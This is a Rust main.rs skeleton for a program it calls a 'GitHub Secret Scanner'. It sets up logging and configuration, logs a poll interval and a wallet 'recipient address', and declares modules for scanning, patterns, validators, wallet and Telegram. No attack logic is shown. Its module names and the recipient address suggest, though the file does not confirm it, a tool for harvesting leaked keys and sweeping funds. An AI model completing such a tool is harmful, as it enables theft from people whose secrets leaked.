mod config;
mod core;
mod scanner;
mod patterns;
mod validators;
mod wallet;
mod telegram;
mod database;
mod monitor;
mod models;

use std::sync::Arc;
use tracing::{info, warn};
use dotenv::dotenv;

#[global_allocator]
static ALLOC: jemallocator::Jemalloc = jemallocator::Jemalloc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Load environment variables
    dotenv().ok();
    
    // Initialize logging
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .with_file(true)
        .with_line_number(true)
        .init();

    info!("🚀 Starting GitHub Secret Scanner...");
    
    // Load configuration
    let config = config::Config::from_env()?;
    let config = Arc::new(config);
    
    info!("✅ Configuration loaded");
    info!("📡 Poll interval: {} seconds", config.poll_interval_secs);
    info!("👛 Recipient address: {}", config.recipient_address);
    
    // Initialize components (placeholder for now)
    // Will be implemented in next files
    
    info!("🔧 Starting scanner engine...");
    
    // Keep alive
    tokio::signal::ctrl_c().await?;
    warn!("🛑 Shutting down...");
    
    Ok(())
}